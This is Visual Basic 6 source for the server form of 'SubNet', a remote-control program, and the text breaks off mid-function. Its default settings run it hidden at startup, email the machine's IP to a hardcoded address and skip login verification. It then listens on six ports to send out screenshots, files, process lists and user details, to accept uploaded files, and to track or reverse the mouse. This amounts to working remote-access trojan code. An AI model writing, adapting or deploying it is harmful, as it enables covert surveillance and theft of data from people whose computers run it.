VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{6FBA474E-43AC-11CE-9A0E-00AA0062BB4C}#1.0#0"; "SYSINFO.OCX"
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
Object = "{E5CEE37F-8CF8-489E-BFA0-8201CBD6AEE8}#1.0#0"; "PicFormat32.ocx"
Begin VB.Form frmServer 
   BackColor       =   &H80000004&
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   4980
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   4680
   Icon            =   "frmServer.frx":0000
   LinkTopic       =   "Form1"
   Picture         =   "frmServer.frx":0CCE
   ScaleHeight     =   4980
   ScaleWidth      =   4680
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin PicFormat32a.PicFormat32 PicFormat 
      Height          =   255
      Left            =   2520
      TabIndex        =   12
      Top             =   3360
      Width           =   255
      _ExtentX        =   450
      _ExtentY        =   450
   End
   Begin VB.Timer tmrMouseClick 
      Enabled         =   0   'False
      Interval        =   10
      Left            =   3960
      Top             =   2640
   End
   Begin VB.Timer tmrMousePos 
      Enabled         =   0   'False
      Interval        =   1500
      Left            =   3480
      Top             =   2640
   End
   Begin MSWinsockLib.Winsock sockScreen 
      Left            =   2040
      Top             =   2160
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   6804
   End
   Begin VB.Timer tmrStatusListen 
      Enabled         =   0   'False
      Interval        =   3000
      Left            =   2520
      Top             =   2640
   End
   Begin VB.Timer tmrStatus 
      Enabled         =   0   'False
      Interval        =   3000
      Left            =   3000
      Top             =   2640
   End
   Begin VB.Timer tmrConnectCheck 
      Enabled         =   0   'False
      Interval        =   10000
      Left            =   3960
      Top             =   2160
   End
   Begin InetCtlsObjects.Inet Inet1 
      Left            =   3120
      Top             =   3600
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
   Begin VB.PictureBox picScreen 
      Height          =   570
      Left            =   3720
      ScaleHeight     =   510
      ScaleWidth      =   510
      TabIndex        =   10
      Top             =   3600
      Width           =   570
   End
   Begin VB.Timer tmrBanned 
      Enabled         =   0   'False
      Interval        =   60000
      Left            =   3480
      Top             =   2160
   End
   Begin VB.Timer tmrRevMouse 
      Enabled         =   0   'False
      Interval        =   10
      Left            =   3000
      Top             =   2160
   End
   Begin VB.TextBox txtEmail 
      Height          =   285
      Left            =   120
      TabIndex        =   9
      Text            =   "usssssy@yahoo.com"
      Top             =   4200
      Width           =   4335
   End
   Begin VB.CheckBox chkSO 
      Caption         =   "Run In Hidden Mode"
      Height          =   255
      Index           =   5
      Left            =   120
      TabIndex        =   8
      Top             =   3840
      Width           =   2295
   End
   Begin VB.CheckBox chkSO 
      Caption         =   "Auto E-mail IP"
      Height          =   255
      Index           =   4
      Left            =   120
      TabIndex        =   7
      Top             =   3600
      Width           =   2295
   End
   Begin VB.CheckBox chkSO 
      Caption         =   "Verify Login"
      Height          =   255
      Index           =   3
      Left            =   120
      TabIndex        =   6
      Top             =   3360
      Width           =   2295
   End
   Begin VB.CheckBox chkSO 
      Caption         =   "Auto Login"
      Height          =   255
      Index           =   2
      Left            =   120
      TabIndex        =   5
      Top             =   3120
      Width           =   2295
   End
   Begin VB.CheckBox chkSO 
      Caption         =   "Allow File Downloads"
      Height          =   255
      Index           =   1
      Left            =   120
      TabIndex        =   4
      Top             =   2880
      Width           =   2295
   End
   Begin VB.CheckBox chkSO 
      Caption         =   "Run At Computer Start-Up"
      Height          =   255
      Index           =   0
      Left            =   120
      TabIndex        =   3
      Top             =   2640
      Width           =   2295
   End
   Begin VB.Timer tmrRefProc 
      Interval        =   10000
      Left            =   2520
      Top             =   2160
   End
   Begin MSWinsockLib.Winsock sckProcesses 
      Left            =   1080
      Top             =   2160
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   6805
   End
   Begin VB.ListBox List1 
      Height          =   255
      Left            =   1200
      TabIndex        =   1
      Top             =   2280
      Width           =   135
   End
   Begin SysInfoLib.SysInfo SysInfo 
      Left            =   2520
      Top             =   3600
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock sockExplorer 
      Left            =   600
      Top             =   2160
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   6801
   End
   Begin MSWinsockLib.Winsock W1 
      Left            =   120
      Top             =   2160
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   6800
   End
   Begin MSWinsockLib.Winsock SockChat 
      Left            =   1560
      Top             =   2160
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   6803
   End
   Begin VB.Label lblXIP 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "External IP = Pending"
      BeginProperty Font 
         Name            =   "BankGothic Lt BT"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00E0E0E0&
      Height          =   135
      Left            =   240
      TabIndex        =   11
      Top             =   1750
      Width           =   4095
   End
   Begin VB.Label Label1 
      Caption         =   "Label1"
      Height          =   255
      Left            =   120
      TabIndex        =   2
      Top             =   4560
      Width           =   4335
   End
   Begin VB.Label lblStatus 
      BackColor       =   &H00000000&
      BackStyle       =   0  'Transparent
      Caption         =   " Status:  Idle"
      BeginProperty Font 
         Name            =   "BankGothic Lt BT"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   615
      Left            =   360
      TabIndex        =   0
      Top             =   960
      Width           =   3855
   End
   Begin VB.Image imgClose 
      Height          =   390
      Left            =   3120
      Picture         =   "frmServer.frx":6C88
      Top             =   360
      Width           =   1170
   End
   Begin VB.Image imgStop 
      Height          =   390
      Left            =   1750
      Picture         =   "frmServer.frx":9842
      Top             =   360
      Width           =   1170
   End
   Begin VB.Image imgStart 
      Height          =   390
      Left            =   360
      Picture         =   "frmServer.frx":C2DC
      Top             =   360
      Width           =   1170
   End
End
Attribute VB_Name = "frmServer"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'**********************************************
'**  Program Name:  SubNet® (©2003-2004)     **
'**  Program Description:  Remotely Control  **
'**       A Computer Via LAN/WAN/Dial-Up     **
'**  Program Ports:  6800-6805               **
'**  GUI Designer:  Steven Tanyi             **
'**     E-mail:  sniper6oo@hotmail.com       **
'**  Programmer:  James Miller               **
'**     E-mail:  usssssy@yahoo.com           **
'**********************************************
Option Explicit
Private Declare Function SHEmptyRecycleBin Lib "shell32.dll" Alias "SHEmptyRecycleBinA" (ByVal hwnd As Long, ByVal pszRootPath As String, ByVal dwFlags As Long) As Long
Dim bBanned As Boolean
Dim rRemoteClient As String
Dim lLoginCount As Long
Dim bFileTransfer As Boolean
Dim sIncomming As String
Dim ComName As String
Dim UsrName As String
Dim RunTime As String
Dim OSPlat As String
Dim OSVer As String
Dim OSBuild As String
Dim msg As String
Dim Filez(0 To 50) As String
Dim Allowed As Boolean
Dim FldrName As String
Dim sSecureLogin As Boolean
'' added for processes
Private Const MAX_PATH& = 260
Private Type PROCESSENTRY32
    dwSize As Long
    cntUsage As Long
    th32ProcessID As Long
    th32DefaultHeapID As Long
    th32ModuleID As Long
    cntThreads As Long
    th32ParentProcessID As Long
    pcPriClassBase As Long
    dwFlags As Long
    szexeFile As String * MAX_PATH
End Type
Private Declare Function TerminateProcess Lib "kernel32" (ByVal ApphProcess As Long, ByVal uExitCode As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal blnheritHandle As Long, ByVal dwAppProcessId As Long) As Long
Private Declare Function ProcessFirst Lib "kernel32" Alias "Process32First" (ByVal hSnapshot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function ProcessNext Lib "kernel32" Alias "Process32Next" (ByVal hSnapshot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function CreateToolhelpSnapshot Lib "kernel32" Alias "CreateToolhelp32Snapshot" (ByVal lFlags As Long, lProcessID As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Dim x(100), y(100), Z(100) As Integer
Dim tmpX(100), tmpY(100), tmpZ(100) As Integer
Dim K As Integer
Dim Zoom As Integer
Dim Speed As Integer
'For Inverse Mouse
Dim boolVal As Boolean
Dim i, Key
Dim PrevX, PrevY
Dim KeyList, STRNG
Dim HitEnter As Boolean
Dim KeyChar, PriorValx
Dim pos As POINTAPI
Dim Prev As POINTAPI
Dim r As Long
Dim rpos As Long
Dim FS As Long
Dim strMClick As String


Private Sub Form_Load()
    StayOnTop frmServer
    Me.Height = 1980
    Me.Width = 4665
    Me.Left = 0
    Me.Top = 0
    Me.Show
    LoadLocalServerInf
End Sub
Private Function mClick(bButton As Integer) As Boolean
    If GetKeyState(bButton) = -127 Or GetKeyState(bButton) = -128 Then
        mClick = True
    End If
End Function
Private Sub LoadLocalServerInf()
    FRMz = 255
    Close
    Allowed = True
    W1.Listen
    sckProcesses.Listen
    sockExplorer.Listen
    SockChat.Listen
    sockScreen.Listen
    UsrName = (Environ("username"))
Select Case SysInfo.OSPlatform
    Case 0
        OSPlat = "Unknown 32-Bit Windows"
    Case 1
        OSPlat = "Windows 95"
    Case 2
        OSPlat = "Windows NT"
End Select
    OSVer = SysInfo.OSVersion
    OSBuild = SysInfo.OSBuild
    ComName = W1.LocalHostName
    RunTime = GetTickCount
    RunTime = ((RunTime / 1000) / 60) / 60
    KillApp ("none")
    eLocalIP = W1.LocalIP
    XIP = GetExternalIP(frmServer.Inet1)
    RemoteEmail = False
    Call LoadEmailInformation
    Load_Info
End Sub
Private Sub Load_Info()
On Error GoTo Err
    nFo = ""
    Open App.Path & "\Subnet.ini" For Input As #1
        Input #1, nFo
    Close
    nFo = Decrypt(nFo, "LOAD INFO")
    Set_Vars nFo
    Exit Sub
Err:
    Close
    Open App.Path & "\Subnet.ini" For Append As #1
        nFo = "1:1:1:0:1:1:usssssy@yahoo.com"
        nFo = Encrypt(nFo)
    Print #1, nFo
    Close
    Load_Info
End Sub
Public Sub Set_Vars(sString As String)
    StrtUp = Mid(sString, 1, 1)
    DownLoad = Mid(sString, 3, 1)
    AutoLogin = Mid(sString, 5, 1)
    verify = Mid(sString, 7, 1)
    Email = Mid(sString, 9, 1)
    Hidden = Mid(sString, 11, 1)
    Addy = Mid(sString, 13, Len(sString))
    chkSO(0).Value = StrtUp
    chkSO(1).Value = DownLoad
    chkSO(2).Value = AutoLogin
    chkSO(3).Value = verify
    chkSO(4).Value = Email
    chkSO(5).Value = Hidden
    txtEmail.Text = Addy
    eTo = Addy
    If verify = 1 Then
        sSecureLogin = True
    Else
        sSecureLogin = False
    End If
    If Hidden = 1 Then
        App.TaskVisible = False
        Me.Visible = False
    Else
        App.TaskVisible = True
        Me.Visible = True
    End If
    If Email = 1 Then Load frmEmail
End Sub
Private Sub SendSettings()
    msg = StrtUp & ":" & DownLoad & ":" & AutoLogin & ":" & verify & ":" & Email & ":" & Hidden & ":" & Addy
    msg = "|OPTIONS|" & msg
    msg = Encrypt(msg)
    If W1.State = sckConnected Then
        W1.SendData msg
    End If
End Sub
Function StayOnTop(Form As Form)
    Dim lFlags As Long
    Dim lStay As Long
    lFlags = SWP_NOSIZE Or SWP_NOMOVE
    lStay = SetWindowPos(Form.hwnd, HWND_TOPMOST, 0, 0, 0, 0, lFlags)
End Function
Public Function KillApp(myName As String) As Boolean
    Const PROCESS_ALL_ACCESS = 0
    Dim uProcess As PROCESSENTRY32
    Dim rProcessFound As Long
    Dim hSnapshot As Long
    Dim szExename As String
    Dim exitCode As Long
    Dim myProcess As Long
    Dim AppKill As Boolean
    Dim appCount As Integer
    Dim i As Integer
On Local Error GoTo Finish
    appCount = 0
    Const TH32CS_SNAPPROCESS As Long = 2&
    uProcess.dwSize = Len(uProcess)
    hSnapshot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)
    rProcessFound = ProcessFirst(hSnapshot, uProcess)
    List1.Clear
    Do While rProcessFound
        i = InStr(1, uProcess.szexeFile, Chr(0))
        szExename = LCase$(Left$(uProcess.szexeFile, i - 1))
        List1.AddItem (szExename)
        If Right$(szExename, Len(myName)) = LCase$(myName) Then
            KillApp = True
            appCount = appCount + 1
            myProcess = OpenProcess(PROCESS_ALL_ACCESS, False, uProcess.th32ProcessID)
            AppKill = TerminateProcess(myProcess, exitCode)
            Call CloseHandle(myProcess)
        End If
        rProcessFound = ProcessNext(hSnapshot, uProcess)
    Loop
    Call CloseHandle(hSnapshot)
Finish:
End Function

Private Sub Form_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
    ReleaseCapture
    SendMessage Me.hwnd, WM_NCLBUTTONDOWN, HTCAPTION, 0&
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    I_AM_UNLOADING
    UnloadForms FRMz
End Sub

Private Sub Form_Terminate()
    I_AM_UNLOADING
    UnloadForms FRMz
End Sub

Private Sub Form_Unload(Cancel As Integer)
    I_AM_UNLOADING
    UnloadForms FRMz
End Sub

Private Sub imgClose_Click()
    Unload Me
End Sub

Private Sub sckProcesses_ConnectionRequest(ByVal requestID As Long)
    KillApp ("none")
    Pause 10
    If sckProcesses.State <> sckClosed Then
        sckProcesses.Close
        sckProcesses.Accept requestID
    Else
        sckProcesses.Accept requestID
    End If
    Dim PROC As String
    Dim q As Integer
    For q = 0 To List1.ListCount ' - 1
        PROC = PROC & ":" & List1.List(q)
    Next q
    Pause 200
    If sckProcesses.State = sckConnected Then
        PROC = Encrypt(PROC)
        sckProcesses.SendData PROC
    End If
    Pause 500
    sckProcesses.Close
    sckProcesses.Listen
End Sub

Private Sub SockChat_ConnectionRequest(ByVal requestID As Long)
    If SockChat.State <> sckClosed Then
        SockChat.Close
        SockChat.Accept requestID
    Else
        SockChat.Accept requestID
    End If
End Sub

Private Sub SockChat_DataArrival(ByVal bytesTotal As Long)
    Dim cData As String
    SockChat.GetData cData
    cData = Decrypt(cData, "SockChat")
    If InStr(1, cData, "|CHAT|") <> 0 Then
        frmChat.txtChat.Text = frmChat.txtChat.Text & Mid(cData, 7, Len(cData)) & vbCrLf
        Check4Voice Mid(cData, 7, Len(cData))
        Exit Sub
    End If
End Sub
Private Sub Check4Voice(vData As String)
    If vData = "(**** Administrator has enabled Voice ****)" Then
        frmChat.Check1.Value = 1
        Exit Sub
    End If
    If vData = "(**** Administrator has disabled Voice ****)" Then
        frmChat.Check1.Value = 0
        Exit Sub
    End If
End Sub

Private Sub sockExplorer_ConnectionRequest(ByVal requestID As Long)
    If sockExplorer.State <> sckClosed Then sockExplorer.Close
    sockExplorer.Accept requestID
    sockExplorer.SendData Enum_Drives
End Sub

Private Sub sockExplorer_DataArrival(ByVal bytesTotal As Long)
    Dim sIncoming As String
    Dim iCommand As Integer
    Dim sData As String
    Dim lRet As Long
    Dim Drive As String
    Dim Command As String
    sockExplorer.GetData sIncoming

    If InStr(1, sIncoming, "|FN|") <> 0 Then
        FldrName = Mid(sIncoming, 5, Len(sIncoming))
        Dim RUAllowed As String
        RUAllowed = UCase(Environ("windir"))
        If RUAllowed = "C:\" & UCase(FldrName) Then
            Allowed = False
        Else
            Allowed = True
        End If
        Exit Sub
    End If
'If InStr(1, sIncoming, "|NEWFOLDER|") <> 0 Then
'    NewFolder Mid(sIncoming, 12, Len(sIncoming))
'    Exit Sub
'End If
'If InStr(1, sIncoming, "|REMOVEFOLDER|") <> 0 Then
'    RmDir Mid(sIncoming, 15, Len(sIncoming))
'    Exit Sub
'End If
    Command = EvalData(sIncoming, 1)
    Drive = EvalData(sIncoming, 2)
    If InStr(1, sIncoming, "|FOLDERS|") <> 0 Then
        If Allowed = False Then
            sockExplorer.SendData "|NOT|"
            Exit Sub
        Else
            lblStatus.Caption = " Status:  Sending Folder (" & FldrName & ")"
            sData = Enum_Folders(Mid$(sIncoming, 10, Len(sIncoming)))
            sockExplorer.SendData sData
            DoEvents
            Sleep (500)
            sData = Enum_Files(Mid$(sIncoming, 10, Len(sIncoming)))
            EvalSize sData
            lblStatus.Caption = " Status:  Sending File Info For Folder: " & FldrName
            tmrStatus.Enabled = True
            Exit Sub
        End If
    End If
    If InStr(1, sIncoming, "|GETFILE|") <> 0 Then
        lblStatus.Caption = " Status:  Transfering - " & Mid(sIncoming, 10, Len(sIncoming))
        SendFile Mid$(sIncoming, 10, Len(sIncoming)), sockExplorer
        sockExplorer.SendData "|COMPLEET|"
        tmrStatus.Enabled = True
        Exit Sub
    End If
    If InStr(1, sIncoming, "|DESKTOP|") <> 0 Then
        SendDesktopImage
        Exit Sub
    End If
    If InStr(1, sIncoming, "|UPLOAD|") <> 0 Then
        Open Mid(sIncoming, 9, Len(sIncoming)) For Binary As #1
        bFileTransfer = True
        Exit Sub
    End If
    If InStr(1, sIncoming, "|DONEUPLOAD|") <> 0 Then
        Dim XYZ As Integer
        XYZ = Len(sIncoming)
        XYZ = XYZ - 12
        sIncoming = Mid(sIncoming, 1, XYZ)
        bFileTransfer = False
        Put #1, , sIncoming
        Close #1
        Exit Sub
    End If
    If bFileTransfer = True Then
        If InStr(1, sIncoming, "|FILESIZE|") <> 0 Then
            Exit Sub
        End If
        Put #1, , sIncoming
    End If
End Sub
Private Sub SendDesktopImage()
    Dim bbmmpp As String
    Dim jjppgg As String
    bbmmpp = App.Path & "\Desktop.bmp"
    jjppgg = App.Path & "\Desktop.jpg"
    Set picScreen.Picture = CaptureScreen()
    SavePicture picScreen.Picture, App.Path & "\Desktop.bmp"
    PicFormat.SaveBmpToJpeg bbmmpp, jjppgg, 100
DoEvents: DoEvents: DoEvents: DoEvents
    lblStatus.Caption = " Status:  Sending Desktop Image"
    SendFile App.Path & "\Desktop.jpg", sockExplorer
    sockExplorer.SendData "|COMPLETE|"
    tmrStatus.Enabled = True
End Sub
Function EvalSize(STRNG As String)
    FS = Len(STRNG)
    If FS <= 4320 Then
        STRNG = "|SOME|" & Mid(STRNG, 8, Len(STRNG))
        sockExplorer.SendData STRNG
        Pause 10
        sockExplorer.SendData "|FILES|"
        Exit Function
    End If
    Dim FS2 As Integer
    If FS > 4320 Then
        For i = 1 To 50
            If FS / i < 4320 Then
                FS2 = i
                BreakItUp STRNG, FS2
                Exit Function
            End If
        Next i
    End If
End Function
Function BreakItUp(WhatToBreakUp As String, HowManyTimes As Integer)
    WhatToBreakUp = Mid(WhatToBreakUp, 8, Len(WhatToBreakUp))
    Dim SCount As Long
    Dim StrB As Integer
    Dim StrC As Integer
    Dim strD As Long
    StrC = 0
    SCount = Len(WhatToBreakUp)
    StrB = SCount / HowManyTimes
    For i = 1 To HowManyTimes
        StrC = StrC + 1
        If StrC = 1 Then
            Filez(i) = "|SOME|" & Mid(WhatToBreakUp, 1, StrB)
            WhatToBreakUp = Mid(WhatToBreakUp, StrB + 1, Len(WhatToBreakUp))
        Else
            If Len(WhatToBreakUp) < StrB Then
                Filez(i) = "|SOME|" & WhatToBreakUp
                Exit For
            Else
                Filez(i) = "|SOME|" & Mid(WhatToBreakUp, 1, StrB)
                WhatToBreakUp = Mid(WhatToBreakUp, StrB + 1, Len(WhatToBreakUp))
            End If
        End If
    Next i
    For i = 0 To 50
        If Filez(i) <> "" Then
            sockExplorer.SendData Filez(i)
            Pause 10
        End If
    Next i
    sockExplorer.SendData "|FILES|"
    For i = 0 To 50
        Filez(i) = ""
    Next i
End Function
Function EvalData(Incoming As String, Side As Integer, Optional SubDiv As String) As String
    Dim i As Integer
    Dim TempStr As String
    Dim Divider As String
    If SubDiv = "" Then
        Divider = ","
    Else
        Divider = SubDiv
    End If
Select Case Side
    Case 1
        For i = 0 To Len(Incoming)
            TempStr = Left(Incoming, i)
            If Right(TempStr, 1) = Divider Then
                EvalData = Left(TempStr, Len(TempStr) - 1)
                Exit Function
            End If
        Next
    Case 2
        For i = 0 To Len(Incoming)
            TempStr = Right(Incoming, i)
            If Left(TempStr, 1) = Divider Then
                EvalData = Right(TempStr, Len(TempStr) - 1)
                Exit Function
            End If
        Next
End Select
End Function

Private Sub sockScreen_Close()
    tmrMousePos.Enabled = False
    sockScreen.Close
    sockScreen.Listen
End Sub

Private Sub sockScreen_ConnectionRequest(ByVal requestID As Long)
    If sockScreen.State <> sckClosed Then
        sockScreen.Close
        sockScreen.Accept requestID
    Else
        sockScreen.Accept requestID
    End If
End Sub

Private Sub sockScreen_DataArrival(ByVal bytesTotal As Long)
    If ScreenSending = True Then Exit Sub
    Dim qwerty As String
    sockScreen.GetData qwerty
    If InStr(1, qwerty, "|STOPTIMER|") <> 0 Then
        tmrMouseClick.Enabled = False
        tmrMousePos.Enabled = False
    End If
    If InStr(1, qwerty, "|SENDNEW|") <> 0 Then
        Dim bbmmpp As String
        Dim jjppgg As String
        bbmmpp = App.Path & "\Desktop.bmp"
        jjppgg = App.Path & "\Desktop.jpg"
On Error Resume Next
        Kill App.Path & "\Desktop.jpg"
        Set picScreen.Picture = CaptureScreen()
        SavePicture picScreen.Picture, App.Path & "\Desktop.bmp"
        PicFormat.SaveBmpToJpeg bbmmpp, jjppgg, 100
        DoEvents: DoEvents: DoEvents: DoEvents
        ScreenSending = True
        SendNewScreen App.Path & "\Desktop.jpg", sockScreen
        sockScreen.SendData "|FINISHED|"
        ScreenSending = False
        tmrMousePos.Enabled = True
    End If
End Sub
Private Sub SendNewScreen(FleName As String, WinS As Winsock)
    tmrMousePos.Enabled = False
    Dim LenFile As Long
    Dim nCnt As Long
    Dim LocData As String
    Open FleName For Binary As #69
        nCnt = 1
        DoEvents
        LenFile = LOF(69)
        WinS.SendData "|FILESIZE|" & LenFile
        DoEvents
        Sleep (400)
        Do Until nCnt >= (LenFile)
            LocData = Space$(1024)
            Get #69, nCnt, LocData
            If nCnt + 1024 > LenFile Then
                WinS.SendData Mid$(LocData, 1, (LenFile - nCnt))
            Else
                WinS.SendData LocData
            End If
            DoEvents
            nCnt = nCnt + 1024
        Loop
    Close #69
End Sub
Private Sub tmrBanned_Timer()
    tmrBanned.Enabled = False
    rRemoteClient = ""
    bBanned = False
    lLoginCount = 0
    cRemCons = 0
End Sub

Private Sub tmrConnectCheck_Timer()
    DoEvents
    XIP = GetExternalIP(frmServer.Inet1)
    If XIP <> "" Then
        tmrConnectCheck.Enabled = False
        lblXIP.Caption = "External IP = " & XIP
    Else
        lblXIP.Caption = "External IP = Pending"
    End If
End Sub

Private Sub tmrMouseClick_Timer()
    tmrMouseClick.Enabled = False
    If mClick(VK_RBUTTON) = True Then
        strMClick = "RIGHT-BUTTON"
    End If
    If mClick(VK_LBUTTON) = True Then
        strMClick = "LEFT-BUTTON"
    End If
    If mClick(VK_MBUTTON) = True Then
        strMClick = "MIDDLE-BUTTON"
    End If
    If strMClick <> "" Then
        Dim torf As Boolean
        Dim CurPos As POINTAPI
        torf = GetCursorPos(CurPos)
        strMClick = "|MCLICK|" & (CurPos.x * Screen.TwipsPerPixelX) / Screen.Width & "|" & (CurPos.y * Screen.TwipsPerPixelY) / Screen.Height & "|" & strMClick
        Exit Sub
    Else
        tmrMouseClick.Enabled = True
    End If
End Sub

Private Sub tmrMousePos_Timer()
    tmrMouseClick.Enabled = False
    If ScreenSending = True Then Exit Sub
    tmrMousePos.Enabled = False
    If strMClick <> "" Then GoTo MouseyClicked
    Dim xMouse As Long
    Dim yMouse As Long
    Dim CurPos As POINTAPI
    Dim torf As Boolean
    torf = GetCursorPos(CurPos)
    xMouse = CurPos.x
    yMouse = CurPos.y
    xMouse = xMouse * Screen.TwipsPerPixelX
    yMouse = yMouse * Screen.TwipsPerPixelY
    Dim XM As Single
    Dim YM As Single
    XM = xMouse / Screen.Width
    YM = yMouse / Screen.Height
    Dim XYPosition As String
    XYPosition = "|MOUSEPOS|" & XM & "|" & YM
    If sockScreen.State = sckConnected Then
        sockScreen.SendData XYPosition
    End If
    tmrMousePos.Enabled = True
    tmrMouseClick.Enabled = True
    Exit Sub
MouseyClicked:
    If sockScreen.State = sckConnected Then
        sockScreen.SendData strMClick
        Pause 20
        strMClick = ""
        tmrMouseClick.Enabled = True
        tmrMousePos.Enabled = True
    End If
End Sub

Private Sub tmrRefProc_Timer()
    KillApp ("none")
    DoEvents
End Sub

Private Sub tmrRevMouse_Timer()
    Prev = pos
    r = GetCursorPos(pos)
    Dim DiffY As Integer, DiffX As Integer
    If Prev.y = 0 And pos.y = 0 Then
        DiffY = 1
    ElseIf Prev.y = 599 And pos.y = 599 Then
        DiffY = -1
    End If
    If Prev.x = 0 And pos.x = 0 Then
        DiffX = 1
    ElseIf Prev.x = 799 And pos.x = 799 Then
        DiffX = -1
    End If
    r = SetCursorPos(Prev.x - (pos.x - Prev.x) + DiffX, Prev.y - (pos.y - Prev.y) + DiffY)
    r = GetCursorPos(pos)
End Sub

Private Sub tmrStatus_Timer()
    tmrStatus.Enabled = False
    lblStatus.Caption = " Status:  Connected"
End Sub

Private Sub tmrStatusListen_Timer()
    tmrStatusListen.Enabled = False
    lblStatus.Caption = " Status:  Listening"
End Sub

Private Sub W1_Close()
    W1.Close
    sckProcesses.Close
    sockExplorer.Close
    SockChat.Close
    sockScreen.Close
    tmrMousePos.Enabled = False
    W1.Listen
    sckProcesses.Listen
    sockExplorer.Listen
    SockChat.Listen
    sockScreen.Listen
    Unload frmChat
    sSecureLogin = False
    Load_Info
    lLoginCount = 0
    rRemoteClient = ""
    tmrStatusListen.Enabled = True
    cRemCons = 0
End Sub

Private Sub W1_ConnectionRequest(ByVal requestID As Long)
    If W1.State = sckConnected Then
        cRemCons = cRemCons + 1
        GoTo vVerify
    End If
    If W1.State <> sckClosed Then
        W1.Close
        W1.Accept requestID
        cRemCons = 1
    Else
        W1.Accept requestID
        cRemCons = 1
    End If
    lblStatus.Caption = " Status:  Connecting..."
vVerify:
    If cRemCons > 1 Then Exit Sub
    lLoginCount = lLoginCount + 1
    If bBanned = True Then
        If W1.RemoteHost = rRemoteClient Then
            lblStatus.Caption = " Status:  Kicking Remote User (Banned)"
            W1.SendData Encrypt("|BANNED|")
            Pause 20
            Close_Connections
            tmrStatusListen.Enabled = True
            Exit Sub
        End If
    End If
    CheckSecure
End Sub
Private Sub CheckSecure()
    If sSecureLogin = False Then
        Finish_Login
        Exit Sub
    Else
        lblStatus.Caption = " Status:  Verifying Remote User..."
        msg = Encrypt("|SECURELOGIN|")
        W1.SendData msg
    End If
End Sub
Private Sub Finish_Login()
    lblStatus.Caption = " Status:  Sending Local Information..."
    List1.Clear
    KillApp ("none")
    RunTime = GetTickCount
    RunTime = ((RunTime / 1000) / 60) / 60
    msg = "|INFO|" & ComName & ":" & UsrName & ":" & RunTime & ":" & OSPlat & ":" & OSVer & ":" & OSBuild
    msg = Encrypt(msg)
    W1.SendData msg
    DoEvents
    Pause 200
    msg = "|OPTIONS|" & nFo
    msg = Encrypt(msg)
    W1.SendData msg
    rRemoteClient = ""
    lLoginCount = 0
    tmrStatus.Enabled = True
End Sub
Private Sub Close_Connections()
    lblStatus.Caption = " Status:  Closing Connections..."
    W1.Close
    sckProcesses.Close
    sockExplorer.Close
    SockChat.Close
    DoEvents
    W1.Listen
    sckProcesses.Listen
    sockExplorer.Listen
    SockChat.Listen
    Unload frmChat
    sSecureLogin = False
    Load_Info
    lLoginCount = 0
    tmrStatusListen.Enabled = True
End Sub
Private Sub Verify_Login(sString As String)
    If bBanned = True Then
        If W1.RemoteHost = rRemoteClient Then
            W1.SendData Encrypt("|BANNED|")
            Pause 20
            Close_Connections
            Exit Sub
        End If
    End If
    lLoginCount = lLoginCount + 1
    If lLoginCount >= 4 Then
        lblStatus.Caption = " Status:  Banning Remote User..."
        rRemoteClient = W1.RemoteHost
        bBanned = True
        W1.SendData Encrypt("|BANNED|")
        Pause 200
        Close_Connections
        tmrBanned.Enabled = True
        Exit Sub
    End If
    Dim rUser As String
    Dim rPass As String
    Dim TT As Long
    TT = InStr(1, sString, ":")
    rUser = Mid(sString, 1, TT - 1)
    rPass = Mid(sString, TT + 1, Len(sString))
    If UserValidate(rUser, rPass) Then
        sSecureLogin = False
        Finish_Login
        Exit Sub
    Else
        lblStatus.Caption = " Status:  Verifying Remote User..."
        msg = Encrypt("|SECURELOGIN|")
        Pause 10
        W1.SendData msg
    End If
End Sub
Private Sub PopUpMsg(mMessage As String)
    lblStatus.Caption = " Status:  Displaying Remote Message..."
    Dim sStyle As Long
    Dim tTitle As String
    sStyle = Mid(mMessage, 1, 1)
    mMessage = Mid(mMessage, 2, Len(mMessage))
    Dim i As Integer
    i = InStr(1, mMessage, "|")
    tTitle = Mid(mMessage, 1, i - 1)
    mMessage = Mid(mMessage, i + 1, Len(mMessage))
    frmMessageBox.lblMsgTitle.Caption = tTitle
    frmMessageBox.lblMessage.Caption = mMessage
    If sStyle = 0 Then
        frmMessageBox.imgCritical.Visible = True
        frmMessageBox.imgOk.Visible = True
    End If
    If sStyle = 1 Then
        frmMessageBox.imgExclamation.Visible = True
        frmMessageBox.imgOk.Visible = True
    End If
    If sStyle = 2 Then frmMessageBox.imgOk.Visible = True
    If sStyle = 3 Then
        frmMessageBox.imgAbort.Visible = True
        frmMessageBox.imgRetry.Visible = True
        frmMessageBox.imgIgnore.Visible = True
    End If
    If sStyle = 4 Then
        frmMessageBox.imgOk.Visible = True
        frmMessageBox.imgCancel.Visible = True
    End If
